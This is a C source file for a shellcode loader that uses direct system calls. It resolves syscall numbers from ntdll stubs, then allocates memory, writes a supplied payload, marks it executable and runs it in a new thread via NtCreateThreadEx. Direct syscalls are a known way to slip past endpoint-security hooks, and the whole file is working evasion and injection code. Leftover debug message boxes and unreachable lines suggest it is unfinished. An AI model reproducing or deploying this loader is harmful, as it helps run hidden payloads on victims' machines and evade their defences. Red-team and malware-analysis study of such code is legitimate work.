#include "injection.h"

VOID GetSyscallNumber(_In_ HMODULE NtdllHandle, _In_ LPCSTR NtFunctionName, _Out_ PDWORD NtFunctionSSN) {
    UINT_PTR NtFunctionAddress = 0;
    NtFunctionAddress = (UINT_PTR)GetProcAddress(NtdllHandle, NtFunctionName);
    if (0 == NtFunctionAddress) {
        PRINTXD("GetProcAddress", GetLastError());
        return;
    }

    *NtFunctionSSN = ((PBYTE)(NtFunctionAddress + 0x4))[0]; // points to the instruction byte, (syscall number)
    return;

}

BOOL DirectSyscallsInjection(_In_ CONST PBYTE Payload, _In_ CONST SIZE_T PayloadSize) {
    BOOL      State = TRUE;
    PVOID     Buffer = NULL;
    HANDLE    ThreadHandle = NULL;
    HANDLE    ProcessHandle = NULL;
    HMODULE   NtdllHandle = NULL;
    DWORD     OldProtection = 0;
    SIZE_T    BytesWritten = 0;
    NTSTATUS  Status = 0;
    ProcessHandle = GetCurrentProcess();
    //DWORD PID = GetCurrentProcessId();
    //CLIENT_ID CID = { (HANDLE)PID, NULL };
    //OBJECT_ATTRIBUTES OA = { sizeof(OA),  NULL };
    //InitializeObjectAttributes(&OA, NULL, 0, NULL, NULL);


    NtdllHandle = GetModuleHandleW(L"NTDLL");
    if (NULL == NtdllHandle) {
        PRINTXD("GetModuleHandleW", GetLastError());
        return FALSE;
    }

    GetSyscallNumber(NtdllHandle, "NtOpenProcess", &h_NtOpenProcessSSN);
    GetSyscallNumber(NtdllHandle, "NtAllocateVirtualMemory", &h_NtAllocateVirtualMemorySSN);
    GetSyscallNumber(NtdllHandle, "NtWriteVirtualMemory", &h_NtWriteVirtualMemorySSN);
    GetSyscallNumber(NtdllHandle, "NtProtectVirtualMemory", &h_NtProtectVirtualMemorySSN);
    GetSyscallNumber(NtdllHandle, "NtCreateThreadEx", &h_NtCreateThreadExSSN);
    GetSyscallNumber(NtdllHandle, "NtWaitForSingleObject", &h_NtWaitForSingleObjectSSN);
    GetSyscallNumber(NtdllHandle, "NtFreeVirtualMemory", &h_NtFreeVirtualMemorySSN);
    GetSyscallNumber(NtdllHandle, "NtClose", &h_NtCloseSSN);

    MessageBoxA(NULL, "1", "1", MB_OK);

    Status = NtAllocateVirtualMemory(ProcessHandle, &Buffer, 0, &PayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (STATUS_SUCCESS != Status) {
        PRINTXD("NtAllocateVirtualMemory", Status);
        State = FALSE; goto CLEANUP;
    }

    Status = NtWriteVirtualMemory(ProcessHandle, Buffer, Payload, PayloadSize, NULL); // &BytesWritten
    if (STATUS_SUCCESS != Status) {
        PRINTXD("NtWriteVirtualMemory", Status);
        State = FALSE; goto CLEANUP;
    }

    Status = NtProtectVirtualMemory(ProcessHandle, &Buffer, &PayloadSize, PAGE_EXECUTE_READ, &OldProtection);
    if (STATUS_SUCCESS != Status) {
        PRINTXD("NtProtectVirtualMemory", Status);
        State = FALSE; goto CLEANUP;
    }
    MessageBoxA(NULL, "3", "3", MB_OK);
                                                              //&OA
    Status = NtCreateThreadEx(&ThreadHandle, THREAD_ALL_ACCESS, NULL, ProcessHandle, Buffer, NULL, FALSE, 0, 0, 0, NULL);
    if (STATUS_SUCCESS != Status) {
        MessageBoxA(NULL, "fail", "fail", MB_OK);
        PRINTXD("NtCreateThreadEx", Status);
        State = FALSE; goto CLEANUP;
    }
    else {
        MessageBoxA(NULL, "works", "works", MB_OK);
        NtWaitForSingleObject(ThreadHandle, FALSE, NULL);
        goto CLEANUP;
    }

    Status = NtWaitForSingleObject(ThreadHandle, FALSE, NULL);
    // NtClose(ThreadHandle);

CLEANUP:
    if (Buffer) {
        Status = NtFreeVirtualMemory(ProcessHandle, &Buffer, &PayloadSize, MEM_DECOMMIT);
        if (STATUS_SUCCESS != Status) {
            PRINTXD("NtFreeVirtualMemory", Status);
        }
    }

    if (ThreadHandle) {
        NtClose(ThreadHandle);
    }

    if (ProcessHandle) {
        NtClose(ProcessHandle);
    }

    return State;
}